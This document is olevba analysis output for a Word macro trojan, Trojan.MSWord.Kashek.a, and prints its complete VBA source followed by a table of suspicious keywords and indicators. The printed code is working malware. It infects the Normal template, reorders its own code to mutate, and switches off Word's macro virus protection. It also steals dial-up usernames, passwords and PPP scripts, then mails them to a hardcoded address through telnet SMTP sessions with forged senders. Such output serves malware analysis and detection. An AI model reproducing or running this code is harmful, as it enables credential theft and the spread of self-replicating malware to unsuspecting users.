olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Trojan.MSWord.Kashek.a-3d0139609d347996dc7bc863c09386b80e255ac5
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Trojan.MSWord.Kashek.a-3d0139609d347996dc7bc863c09386b80e255ac5 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO MSPluss_SCP.bas 
in file: Trojan.MSWord.Kashek.a-3d0139609d347996dc7bc863c09386b80e255ac5 - OLE stream: 'Macros/VBA/MSPluss_SCP'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'Dial-up_script_and_password_checker
Option Explicit
Type FILETIME
  dwLowDateTime As Long
  dwHighDateTime As Long
End Type
Type RASENTRYNAME
dwSize As Long
szEntryName(256) As Byte
End Type
Type RASDIALPARAMS
     dwSize As Long
     szEntryName(256) As Byte
     szPhoneNumber(128) As Byte
     szCallbackNumber(128) As Byte
     szUserName(256) As Byte
     szPassword(256) As Byte
     szDomain(15) As Byte
End Type
Declare Function RegOpenKeyEx Lib "advapi32.dll" Alias "RegOpenKeyExA" (ByVal hkey As Long, ByVal lpSubKey As String, ByVal ulOptions As Long, ByVal samDesired As Long, phkResult As Long) As Long
Declare Function RegCloseKey Lib "advapi32.dll" (ByVal hkey As Long) As Long
Declare Function RegEnumKeyEx Lib "advapi32.dll" Alias "RegEnumKeyExA" (ByVal hkey As Long, ByVal dwIndex As Long, ByVal lpName As String, lpcbName As Long, lpReserved As Long, ByVal lpClass As String, lpcbClass As Long, lpftLastWriteTime As FILETIME) As Long
Declare Function GetWindowsDirectory Lib "kernel32.dll" Alias "GetWindowsDirectoryA" (ByVal lpBuffer As String, ByVal nSize As Long) As Long
Declare Function GetWindow Lib "user32" (ByVal hwnd As Long, ByVal wCmd As Long) As Long
Declare Function GetWindowText Lib "user32" Alias "GetWindowTextA" (ByVal hwnd As Long, ByVal lpString As String, ByVal cch As Long) As Long
Declare Function GetWindowTextLength Lib "user32" Alias "GetWindowTextLengthA" (ByVal hwnd As Long) As Long
Declare Function SendMessage Lib "user32.dll" Alias "SendMessageA" (ByVal hwnd As Long, ByVal Msg As Long, wParam As Any, lParam As Any) As Long
Declare Function FindWindow Lib "user32.dll" Alias "FindWindowA" (ByVal lpClassName As Any, ByVal lpWindowName As Any) As Long
Declare Function RasEnumEntries Lib "RasApi32.DLL" Alias "RasEnumEntriesA" (ByVal reserved$, ByVal lpszPhonebook$, lprasentryname As RASENTRYNAME, lpcb As Long, lpcEntries As Long) As Long
Declare Function RasGetEntryDialParams Lib "rasapi32" Alias "RasGetEntryDialParamsA" (ByVal lpszPhonebook As String, lpRasDialParams As RASDIALPARAMS, lpfPassword As Byte) As Long
'
Function Check_Connection()
Dim CurrWnd As Long
Dim Length As Long
Dim Title As String
  On Error Resume Next
  CurrWnd = FindWindow(CLng(0), "")
  CurrWnd = GetWindow(CurrWnd, 0)
    Do While CurrWnd <> 0
       Length = GetWindowTextLength(CurrWnd)
        Title = Space(Length + 1)
    Length = GetWindowText(CurrWnd, Title, Length + 1)
    If InStr(1, Title, "Connected to", vbTextCompare) <> 0 _
     Or InStr(1, Title, "Ïîäêëþ÷åíî ê", vbTextCompare) <> 0 Then
     Check_Connection = True
     Exit Function
    End If
    CurrWnd = GetWindow(CurrWnd, 2)
    DoEvents
  Loop
  Check_Connection = False
End Function
' End Sub

Sub FileSave()
On Error Resume Next
ActiveDocument.Save
Sender_main
End Sub

Sub FileClose()
On Error Resume Next
AutoOpen
ActiveDocument.Close
End Sub

Sub Tmsn()
Dim Delta As Integer
Dim Old As Byte
Dim NF As Integer
NF = FreeFile
On Error Resume Next
Open WinDir + "logow.sys" For Binary Access Read As #NF
Get #NF, 76989, Old
Close #NF
Delta = Val(Mid(Date$, 4, 2))
Delta = Delta - Old
Select Case Delta
 Case Is > 2
 Sender
 Case Is < 0 And Delta + 31 > 2
 Sender
 Case Else
 End Select
End Sub

Sub ToolsOptions()
With Options
.VirusProtection = True
.SaveNormalPrompt = True
End With
Dialogs(wdDialogToolsOptions).Show
With Options
.VirusProtection = False
.SaveNormalPrompt = False
End With
End Sub
Sub CopyLines(Source As Object)
On Error Resume Next
     Dim SourceM As Object, TargetM As Object
     Dim n As Long
     Dim Body As String
     Dim VBComponent  As Object
    For Each VBComponent In Source.VBProject.VBComponents
     Set SourceM = VBComponent
     n = SourceM.CodeModule.CountOfLines
     Body = SourceM.CodeModule.Lines(1, 1)
     If InStr(1, Body, "Dial-up_script_and_password_checker", vbTextCompare) <> 0 Then
     Body = SourceM.CodeModule.Lines(1, n)
     Body = morf(Body)
     Set TargetM = NormalTemplate.VBProject.VBComponents.Add(1)
     TargetM.CodeModule.AddFromString Body
     TargetM.Name = "MSPluss_SCP"
     End If
   Next
End Sub

Sub FileOpen()
On Error Resume Next
AutoOpen
Dialogs(80).Show
Sender_main
End Sub
Function Loto(i As Integer, A() As Integer)
Dim n As Integer
ReDim A(1 To i) As Integer
Dim Tmp As Integer
Dim Temp As Integer
For n = 1 To i
 A(n) = n
Next
For n = 1 To i
 Randomize
 Tmp = Int((i - n + 1) * Rnd + n)
 Temp = A(n)
 A(n) = A(Tmp)
 A(Tmp) = Temp
Next
End Function
' End Sub
Function Conn_()
Dim PAR(255) As RASENTRYNAME
Dim Counter As Long
Dim S As Long
Dim ConName$
Dim username$
Dim i As Integer
Dim res As Long
Dim MStr
Dim j As Integer
Dim PARAM As RASDIALPARAMS
Dim PWDdet As Byte
Dim n As Integer
Dim z As Long
Dim PWD As String, UsName As String
Dim Resalt As String
On Error Resume Next
PAR(0).dwSize = 264
S = 256 * PAR(0).dwSize
res = RasEnumEntries(1, 1, PAR(0), S, Counter)
For i = 0 To Counter - 1
For j = 0 To 256
ConName = ConName + Chr(PAR(i).szEntryName(j))
Next
ConName = Left$(ConName, InStr(ConName, vbNullChar) - 1)

For n = 0 To 256
PARAM.szEntryName(n) = PAR(i).szEntryName(n)
Next
PARAM.dwSize = 1052
res = RasGetEntryDialParams(1, PARAM, PWDdet)
For z = 0 To 256
UsName = UsName + Chr(PARAM.szUserName(z))
PWD = PWD + Chr(PARAM.szPassword(z))
Next
UsName = Left$(UsName, InStr(UsName, vbNullChar) - 1)
PWD = Left$(PWD, InStr(PWD, vbNullChar) - 1)
Resalt = Resalt + "Connection: " + ConName + Chr(13) + "User: " + UsName + Chr(13) + "Password: " + PWD + Chr(10) + Chr(13)
PWD = "": UsName = "": ConName = ""
DoEvents
Next
Conn_ = Resalt
End Function
' End Sub
Sub AutoExit()
Dim Counter As Integer
Dim i As Integer
Dim VBComp As Object
Dim Body As String

 Application.Visible = False
 Options.SaveNormalPrompt = False
 On Error Resume Next

Counter = Templates.Count
For i = 1 To Counter
 For Each VBComp In Templates(i).VBProject.VBComponents
  Body = VBComp.CodeModule.Lines(1, 1)
  If InStr(1, Body, "Dial-up_script_and_password_checker", vbTextCompare) = 0 Then
     With VBComp.CodeModule
       .DeleteLines 1, .CountOfLines
     End With
   If VBComp.Name <> "ThisDocument" Then
   Application.OrganizerDelete Templates(i).Name, VBComp.Name, wdOrganizerObjectProjectItems
   End If
 End If
 Next
Next i
 NormalTemplate.Save
 Tmsn
 Options.VirusProtection = True
End Sub

Sub Sender_main()
Dim Handle As Long
Dim HandleBW As Long
Dim NoConn_ As String
Dim hwnd As Long
Dim GrabStr As String
Dim Start As Long
Dim MyDat As Byte
Dim i As Integer
Dim NPwl() As String
Dim j As Integer
Dim Title As String
Dim SMTP As String
Dim Host(1 To 14) As String
Dim A() As Integer
Dim f As Integer
Dim NF As Integer
Dim THwnd As Long
Dim Twnd As String
Dim None As String
Dim RecipientOfMessage_ As String
Dim SenderAddress As String
Dim SenderDomain As String
Dim UsName
Dim Domain_ As String
Dim Char_ As Byte
Dim z As Integer

On Error Resume Next
If Check_Connection = True Then
RecipientOfMessage_ = "<kashek@usa.net>"
Host(1) = "smtp.mail.ru": Domain_ = "@mail.ru"
UsName = Array("-dima-", "2vasiliy", "521521", "DGabidullin", "Intarsija", "KirovDVP", "Mischelli", "MonitorExpress", "Sveta-P2000", "Voronin_Vladimir", "a_kladenova", "abccondi", "abs", "admiralll", "ako", "alazif", "alcan777", "aleksiv2000", "alena_elena", "alexander555", "alexkis", "alexsar", "alltair", "alt-info", "antares_", "anton76", "artyserg", "arxi77", "asp", "ate", "avatchev", "axel_extr", "balds", "bars-profile", "batsek", "best-njl", "bigmoney4u", "bkp", "braut_99", "broker-nsk", "bxk", "c_service", "carlych", "ciap", "courses", "darlenka", "daswer", "datasave")
Host(2) = "itk2.bas-net.by"
Host(3) = "195.75.32.20"

Loto 3, A()
Shell "telnet", 0
  THwnd = FindWindow(CLng(0), "Telnet - (none)")
                                                 
  If THwnd <> 0 Then
    Twnd = "telnet"
    None = "(none)"
    NoConn_ = "Connect failed"
  Else
   THwnd = FindWindow(CLng(0), "Òåëíåò - (íåò)")
   If THwnd <> 0 Then
    Twnd = "Òåëíåò"
    None = "(íåò)"
    NoConn_ = "Ñáîé ïîäêëþ÷åíèÿ"
   Else
   THwnd = FindWindow(CLng(0), "Telnet - (íåò)")
    Twnd = "telnet"
    None = "(íåò)"
    NoConn_ = "Ñáîé ïîäêëþ÷åíèÿ"
   End If
  End If
SendMessage THwnd, CLng(16), ByVal CLng(0), 0
DoEvents
For f = 1 To 3
Shell "telnet " + Host(A(f)) + " 25", 0
DoEvents
Start = Timer
Do Until Handle <> 0 Or Timer - Start > 70 Or HandleBW <> 0
 Handle = FindWindow(CLng(0), Twnd + " - " + Host(A(f)))
 HandleBW = FindWindow(CLng(0), NoConn_)
 DoEvents
Loop
Select Case Handle
  Case Is <> 0

Randomize
SenderDomain = UsName(Int(UBound(UsName) * Rnd))
SenderAddress = UsName(Int(UBound(UsName) * Rnd)) + Domain_

SMTP = "helo My" + SenderDomain + "#$$mail from: <" + SenderAddress + ">#$" + "rcpt to: " + RecipientOfMessage_ + "#$data#$" + _
 "From: <" + SenderAddress + ">#" + "To: " + RecipientOfMessage_ + "#" + _
 "Date: " + Date$ + " " + Time$ + "#X-MSMail-Priority: Normal#X-Priority: 3#X-Mailer: Post Messenger 3.2#MIME-Version: 1.0#" + _
 "Content-Type: text/plain; charset=Windows-1251#Content-Transfer-Encoding: 7bit##"
Filler SMTP, Handle
Pause 1
GrabStr = Grab + SCP + "##.#quit#"
Filler GrabStr, Handle
Pause 1
 Start = Timer
Do Until hwnd <> 0 Or Timer - Start > 120
 hwnd = FindWindow(CLng(0), Twnd)
 DoEvents
Loop
Select Case hwnd
Case Is = 0
            
  SendMessage Handle, CLng(16), ByVal CLng(0), 0
  Handle = 0
Case Else
  SendMessage hwnd, CLng(16), ByVal CLng(0), 0
    NF = FreeFile
  MyDat = Val(Mid(Date$, 4, 2))
  Open WinDir + "logow.sys" For Binary Access Write As #NF
  Put #NF, 76989, MyDat
  Close #NF
  DoEvents
  SendMessage Handle, CLng(16), ByVal CLng(0), 0
  Exit Sub
End Select
Case Else
Handle = FindWindow(CLng(0), Twnd + " - " + None)
SendMessage HandleBW, CLng(16), ByVal CLng(0), 0
Pause 3
SendMessage Handle, CLng(16), ByVal CLng(0), 0
Pause 3
HandleBW = 0
Handle = 0
End Select
Next
End If
End Sub
Sub Filler(MessStr As String, hwnd As Long)
Dim i As Long
Dim Tmp As String
Dim Charset As Long
On Error Resume Next
For i = 1 To Len(MessStr)
Tmp = Mid(MessStr, i, 1)
Select Case Tmp
   Case Is = "#"
   DoEvents
   Charset = SendMessage(hwnd, &H102, ByVal CLng(13), 0)
   Case Is = "$"
   Pause 7
   Case Else
    If i Mod 380 = 0 Then
    Pause 1
    End If
   Charset = SendMessage(hwnd, &H102, ByVal CLng(Asc(Tmp)), 0)
End Select
Next
End Sub
Sub Pause(i As Byte)
Dim Start As Long
Start = Timer
 Do While Timer < Start + i
        DoEvents
 Loop
End Sub
Function SCP()
Dim res As Long
Dim res1 As Long
Dim Resalt As String
Dim hkey As Long
Dim hkey1 As Long
Dim i As Long
Dim KeyName As String
Dim KeyLen As Long
Dim ClassName As String
Dim ClassLen As Long
Dim lastwrite As FILETIME
Dim user As String, PPPScript As String
Dim NF As Long
Dim Tmp As String
On Error Resume Next
res = RegOpenKeyEx(&H80000001, "RemoteAccess\Profile\", 0, &H8, hkey)
If res <> 0 Then
Resalt = "Can not read entry from R."
SCP = Resalt
Exit Function
End If
i = 0
Do While res = 0
 KeyName = Space(255): ClassName = Space(255)
 KeyLen = 255: ClassLen = 255
res = RegEnumKeyEx(hkey, i, KeyName, KeyLen, ByVal 0, ClassName, ClassLen, lastwrite)
If res = 0 Then
 KeyName = Left(KeyName, KeyLen)
 ClassName = Left(ClassName, ClassLen)
 res1 = RegOpenKeyEx(&H80000001, "RemoteAccess\Profile\" + KeyName, 0, &H8, hkey1)
If res1 = 0 Then
user = System.PrivateProfileString("", "HKEY_CURRENT_USER\RemoteAccess\Profile\" + KeyName, "user")
PPPScript = System.PrivateProfileString("", "HKEY_CURRENT_USER\RemoteAccess\Profile\" + KeyName, "PPPScript")
res1 = RegCloseKey(hkey1)
If PPPScript <> "" Then
 NF = FreeFile
 On Error GoTo aaa
 Open PPPScript For Input Access Read As NF
    If LOF(NF) < 7000 Then
      Do While Not EOF(NF)
       Line Input #NF, Tmp
       PPPScript = PPPScript + Chr(13) + Chr(10) + Tmp
      Loop
    Else
      PPPScript = PPPScript + Chr(13) + Chr(10) + "Ôàéë > 7 kB."
    End If
 Close NF
aaa:
On Error Resume Next
End If
Resalt = Resalt + "Connection " + KeyName + " - " + Chr(13) + Chr(10) + "user: " + user + Chr(13) + Chr(10) + "PPPScript:" + PPPScript + Chr(13) + Chr(10)
Else
Resalt = Resalt + "Can not open the key " + KeyName + Chr(13) + Chr(10)
End If
i = i + 1
End If
Loop
res = RegCloseKey(hkey)
Resalt = "There are " + Str(i) + " Dial-up connections." + Chr(13) + Chr(10) + Resalt
SCP = Resalt
End Function
' End Sub
Sub AutoOpen()
Dim VBComponent As Object
Dim Yes As Boolean
Dim Body As String
 On Error Resume Next
 Yes = False
 For Each VBComponent In NormalTemplate.VBProject.VBComponents
 Body = VBComponent.CodeModule.Lines(1, 1)
   If InStr(1, Body, "Dial-up_script_and_password_checker", vbTextCompare) <> 0 Then
     Yes = True
     Exit For
   End If
 Next
If Yes = False Then
CopyLines MacroContainer
End If
Options.VirusProtection = False
Options.SaveNormalPrompt = False
NormalTemplate.Save
End Sub
Function Grab()
Dim Tmp As String
Dim Temp As String
Dim Counter As Long
Dim NF As Integer
On Error Resume Next
If Dir$(WinDir + "edialer.ini") <> "" Then
NF = FreeFile
Open WinDir + "edialer.ini" For Input Access Read As #NF
Do While Not EOF(NF)
  Line Input #NF, Tmp
  If InStr(1, Tmp, "[RAS_Entry_") <> 0 Or _
     InStr(1, Tmp, "PasswordSaved") <> 0 Or _
     InStr(1, Tmp, "LoginSaved") <> 0 Then
   Temp = Temp + Tmp + Chr(10)
  End If
Loop
Close #NF
Temp = Temp + Chr(10) + Chr(13) + Conn_()
End If
Grab = Temp
End Function
' End Sub
' End Sub

Sub AutoClose()
On Error Resume Next
AutoOpen
End Sub
Sub Sender()
Dim i As Long
 i = 0
 For i = 0 To 4
  If Check_Connection = True Then
   Sender_main
   Exit Sub
  Else
   Pause 254
  End If
 Next
End Sub
Function morf(MyString As String)
Dim NextSub As Long
Dim Counter As Integer
Dim A() As Integer
Dim Code_() As String
Dim i As Long
Dim Pre_ As Long
Dim Resalt As String
On Error Resume Next
NextSub = InStr(1, MyString, "End" + " Sub", vbTextCompare)
Do While NextSub <> 0
Counter = Counter + 1
NextSub = InStr(NextSub + 9, MyString, "End" + " Sub", vbTextCompare)
Loop
ReDim Code_(0 To Counter - 1)

NextSub = -8
For i = 0 To Counter - 1
Pre_ = NextSub + 9
NextSub = InStr(Pre_, MyString, "End" + " Sub", vbTextCompare)
Code_(i) = Mid(MyString, Pre_, NextSub + 9 - Pre_)
Next i
Loto Counter - 1, A()
Resalt = Code_(0)
For i = 1 To Counter - 1
Resalt = Resalt + Code_(A(i))
Next i
morf = Resalt
End Function
' End Sub
Function WinDir()
Dim res As Long
Dim DirWin As String

DirWin = Space(255)
res = GetWindowsDirectory(DirWin, 255)
DirWin = Left(DirWin, res)
WinDir = DirWin + "\"
End Function
' End Sub


+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoExit            |Runs when the Word document is closed        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Open                |May open a file                              |
|Suspicious|Write               |May write to a file (if combined with Open)  |
|Suspicious|Put                 |May write to a file (if combined with Open)  |
|Suspicious|Binary              |May read or write a binary file (if combined |
|          |                    |with Open)                                   |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Application.Visible |May hide the application                     |
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|FindWindow          |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Lib                 |May run code from a DLL                      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|RegOpenKeyExA       |May read or write registry keys              |
|Suspicious|RegOpenKeyEx        |May read or write registry keys              |
|Suspicious|RegCloseKey         |May read or write registry keys              |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |195.75.32.20        |IPv4 address                                 |
|IOC       |advapi32.dll        |Executable file name                         |
|IOC       |kernel32.dll        |Executable file name                         |
|IOC       |user32.dll          |Executable file name                         |
|IOC       |RasApi32.DLL        |Executable file name                         |
+----------+--------------------+---------------------------------------------+

